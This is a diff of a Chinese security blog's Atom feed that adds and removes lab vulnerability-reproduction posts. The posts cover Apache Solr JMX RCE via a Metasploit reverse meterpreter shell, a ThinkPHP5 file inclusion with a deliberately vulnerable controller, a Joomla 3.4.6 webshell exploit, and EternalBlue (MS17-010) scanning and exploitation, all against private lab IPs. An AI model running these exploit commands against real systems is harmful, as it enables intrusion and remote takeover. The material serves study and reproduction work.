@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2019-11-20T12:46:37.842Z</updated>
+  <updated>2019-11-25T08:03:11.062Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -15,6 +15,48 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Apache Solr JMX服务远程代码执行复现</title>
+    <link href="http://yoursite.com/2019/11/25/Apache-Solr-JMX%E6%9C%8D%E5%8A%A1%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%A4%8D%E7%8E%B0/"/>
+    <id>http://yoursite.com/2019/11/25/Apache-Solr-JMX服务远程代码执行复现/</id>
+    <published>2019-11-25T07:51:46.000Z</published>
+    <updated>2019-11-25T08:03:11.062Z</updated>
+    
+    <content type="html"><![CDATA[<p>这个漏洞是由于配置的时候默认开启了JMX(版本8.1.1和8.2.0)<br><a id="more"></a></p><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><ul><li>Kali:192.168.43.141</li><li>Ubuntu:192.168.43.131<br>首先我们在Ubuntu上安装 Solr<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https://mirrors.tuna.tsinghua.edu.cn/apache/lucene/solr/8.2.0/solr-8.2.0.zip</span><br><span class="line">unzip solr-8.2.0.zip</span><br></pre></td></tr></table></figure></li></ul><p>进入到bin目录下，启动Solr<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./solr start -force</span><br></pre></td></tr></table></figure></p><p><img src="/2019/11/25/Apache-Solr-JMX服务远程代码执行复现/start.png" alt><br>显示这样，说明环境搭建好了</p><p>查看bin目录下的solr.in.sh<br><img src="/2019/11/25/Apache-Solr-JMX服务远程代码执行复现/JMX.png" alt><br>看这里开启了JMX，默认端口为18983</p><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>我们在kali上使用msfconsole进行攻击<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#设置exp</span><br><span class="line">use exploit/multi/misc/java_jmx_server</span><br><span class="line">set RHOST 192.168.43.131</span><br><span class="line">set RPORT 18983</span><br><span class="line"></span><br><span class="line">#设置监听</span><br><span class="line">set payload java/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 192.168.43.141</span><br><span class="line">run</span><br></pre></td></tr></table></figure></p><p><img src="/2019/11/25/Apache-Solr-JMX服务远程代码执行复现/success.png" alt></p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;这个漏洞是由于配置的时候默认开启了JMX(版本8.1.1和8.2.0)&lt;br&gt;&lt;/p&gt;
+    
+    </summary>
+    
+    
+    
+      <category term="漏洞复现" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Thinkphp5-文件包含</title>
+    <link href="http://yoursite.com/2019/11/21/Thinkphp5-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
+    <id>http://yoursite.com/2019/11/21/Thinkphp5-文件包含/</id>
+    <published>2019-11-21T02:06:24.000Z</published>
+    <updated>2019-11-21T03:27:52.355Z</updated>
+    
+    <content type="html"><![CDATA[<p>漏洞影响版本： 5.0.0&lt;=ThinkPHP5&lt;=5.0.18 、5.1.0&lt;=ThinkPHP&lt;=5.1.10<br><a id="more"></a></p><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>composer<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer create-project --prefer-dist topthink/think=5.0.18 tpdemo</span><br></pre></td></tr></table></figure></p><p>然后修改其中的composer.json，修改require:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot;require&quot;: &#123;</span><br><span class="line">    &quot;php&quot;: &quot;&gt;=5.6.0&quot;,</span><br><span class="line">    &quot;topthink/framework&quot;: &quot;5.0.18&quot;</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure></p><p>然后更新<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer update</span><br></pre></td></tr></table></figure></p><p>修改 <strong>application/index/controller/Index.php</strong> 文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace app\index\controller;</span><br><span class="line">use think\Controller;</span><br><span class="line">class Index extends Controller</span><br><span class="line">&#123;</span><br><span class="line">    public function index()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;assign(request()-&gt;get());</span><br><span class="line">        return $this-&gt;fetch(); </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>创建 <strong>application/index/view/index/index.html</strong> ，内容啥都行，没有这个的话会报错，整了好久 ==</p><p>然后在public目录下新建一个test.php，内容：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">phpinfo();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>访问url: <a href="http://127.0.0.1/tpdemo5.0.18/public/?cacheFile=test.php" target="_blank" rel="noopener">http://127.0.0.1/tpdemo5.0.18/public/?cacheFile=test.php</a><br><img src="/2019/11/21/Thinkphp5-文件包含/phpinfo.png" alt></p><p>这样就好了，接下来我们分析跟踪漏洞的成因</p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;漏洞影响版本： 5.0.0&amp;lt;=ThinkPHP5&amp;lt;=5.0.18 、5.1.0&amp;lt;=ThinkPHP&amp;lt;=5.1.10&lt;br&gt;&lt;/p&gt;
+    
+    </summary>
+    
+    
+    
+      <category term="代码审计" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
+    
+  </entry>
   
   <entry>
     <title>Thinkphp5-insert注入</title>
@@ -395,57 +437,6 @@
     </summary>
     
     
-    
-  </entry>
-  
-  <entry>
-    <title>Joomla 3.4.6 configuration.php 漏洞</title>
-    <link href="http://yoursite.com/2019/10/10/Joomla-3-4-6-configuration-php-%E6%BC%8F%E6%B4%9E/"/>
-    <id>http://yoursite.com/2019/10/10/Joomla-3-4-6-configuration-php-漏洞/</id>
-    <published>2019-10-10T06:13:34.000Z</published>
-    <updated>2019-10-10T11:28:46.325Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><ul><li>Joolma: <a href="https://downloads.joomla.org/it/cms/joomla3/3-4-6" target="_blank" rel="noopener">https://downloads.joomla.org/it/cms/joomla3/3-4-6</a></li><li>EXP: <a href="https://www.exploit-db.com/exploits/47465" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/47465</a></li><li>Target: <a href="http://127.0.0.1/joolma/" target="_blank" rel="noopener">http://127.0.0.1/joolma/</a></li><li>Phpstudy<a id="more"></a></li></ul><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>首先使用脚本检测一下是否存在漏洞<br><img src="/2019/10/10/Joomla-3-4-6-configuration-php-漏洞/vulnerable.png" alt></p><p>然后利用exploit参数进行攻击，因为是本地复现，所以后面监听的端口就随意了<br><img src="/2019/10/10/Joomla-3-4-6-configuration-php-漏洞/exp.png" alt></p><p>图中的框框就是我们shell的地址和密码了，遂用菜刀链接之<br><img src="/2019/10/10/Joomla-3-4-6-configuration-php-漏洞/websehll.png" alt></p><p>再来看看我们的configuration.php中的内容怎么样了<br><img src="/2019/10/10/Joomla-3-4-6-configuration-php-漏洞/conf.png" alt><br>发现在我们的文件最后面添加上了一句话</p><h1 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h1><p><a href="https://www.cnblogs.com/magic-zero/p/11643916.html" target="_blank" rel="noopener">https://www.cnblogs.com/magic-zero/p/11643916.html</a><br><img src="/2019/10/10/Joomla-3-4-6-configuration-php-漏洞/reson.png" alt></p>]]></content>
-    
-    <summary type="html">
-    
-      &lt;h1 id=&quot;环境&quot;&gt;&lt;a href=&quot;#环境&quot; class=&quot;headerlink&quot; title=&quot;环境&quot;&gt;&lt;/a&gt;环境&lt;/h1&gt;&lt;ul&gt;
-&lt;li&gt;Joolma: &lt;a href=&quot;https://downloads.joomla.org/it/cms/joomla3/3-4-6&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://downloads.joomla.org/it/cms/joomla3/3-4-6&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;EXP: &lt;a href=&quot;https://www.exploit-db.com/exploits/47465&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.exploit-db.com/exploits/47465&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;Target: &lt;a href=&quot;http://127.0.0.1/joolma/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://127.0.0.1/joolma/&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;Phpstudy&lt;/li&gt;&lt;/ul&gt;
-    
-    </summary>
-    
-    
-    
-      <category term="漏洞复现" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>MS17_010漏洞复现</title>
-    <link href="http://yoursite.com/2019/10/09/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
-    <id>http://yoursite.com/2019/10/09/MS17-010漏洞复现/</id>
-    <published>2019-10-09T08:08:08.000Z</published>
-    <updated>2019-10-09T08:58:54.008Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><ul><li>KALI:192.168.79.130</li><li>WIN7:192.168.79.128</li><li>WIN2008:192.168.79.128</li><li>Msf</li></ul><a id="more"></a><h1 id="探测"><a href="#探测" class="headerlink" title="探测"></a>探测</h1><p>首先打开msf的控制台，我们搜索17010漏洞相关的利用脚本<br><img src="/2019/10/09/MS17-010漏洞复现/console.png" alt></p><p>这里看见有两个种模块<br>auxiliary(探测)<br>exploits(利用)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#利用这个探测模块</span><br><span class="line">use auxiliary/scanner/smb/smb_ms17_010</span><br><span class="line"></span><br><span class="line">#设置目标，扫描这个网段</span><br><span class="line">set RHOST 192.168.79.2/24</span><br><span class="line"></span><br><span class="line">#设置线程</span><br><span class="line">set THREADS 3</span><br><span class="line"></span><br><span class="line">#运行</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="/2019/10/09/MS17-010漏洞复现/scan.png" alt><br>这里发现了我们的两台windos主机都探测出了漏洞</p><h1 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h1><p>使用exploit模块<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">set RHOST 192.168.79.128</span><br><span class="line">run</span><br></pre></td></tr></table></figure></p><p><img src="/2019/10/09/MS17-010漏洞复现/shell.png" alt></p><p>这里我们就拿下目标主机的shell了</p>]]></content>
-    
-    <summary type="html">
-    
-      &lt;h1 id=&quot;环境&quot;&gt;&lt;a href=&quot;#环境&quot; class=&quot;headerlink&quot; title=&quot;环境&quot;&gt;&lt;/a&gt;环境&lt;/h1&gt;&lt;ul&gt;
-&lt;li&gt;KALI:192.168.79.130&lt;/li&gt;
-&lt;li&gt;WIN7:192.168.79.128&lt;/li&gt;
-&lt;li&gt;WIN2008:192.168.79.128&lt;/li&gt;
-&lt;li&gt;Msf&lt;/li&gt;
-&lt;/ul&gt;
-    
-    </summary>
-    
-    
-    
-      <category term="主机漏洞" scheme="http://yoursite.com/tags/%E4%B8%BB%E6%9C%BA%E6%BC%8F%E6%B4%9E/"/>
     
   </entry>
   
